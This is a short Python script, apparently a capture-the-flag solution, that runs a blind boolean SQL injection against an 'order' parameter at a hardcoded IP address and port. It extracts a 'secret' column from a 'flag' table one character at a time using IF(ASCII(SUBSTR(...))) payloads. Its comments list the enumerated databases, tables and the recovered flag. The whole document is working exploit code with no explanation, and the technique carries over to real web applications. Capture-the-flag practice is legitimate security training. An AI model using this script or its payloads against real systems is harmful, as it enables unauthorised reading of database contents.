import requests

chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_`{|}?!()+,-./<=>^_{|}~ '
url = 'http://125.235.240.166:20105/index?order='
# SELECT * from items where name='''


for i in range(0, 10):
    rs = ''
    for j in range(1, 50):
        br = False
        for c in chars:
            if c == ' ':
                br = True
                break
            payload = f"IF(ASCII(SUBSTR((SELECT secret FROM flag LIMIT {i}, 1),{j},1))=ASCII('{c}'),name,price) limit 1;"
            res = requests.get(url=url+payload)
            if ('499' in res.text):
                rs = rs + c
                print(rs)
                break
        if br:
            break
    print(f"{i}: {rs}")
# RESULT DB
# information_schema
# vannd
# RESULT TBL
# flag -> secret -> ascis{sql_1njecti0n_ba5e_0n_order_by}
# products
#
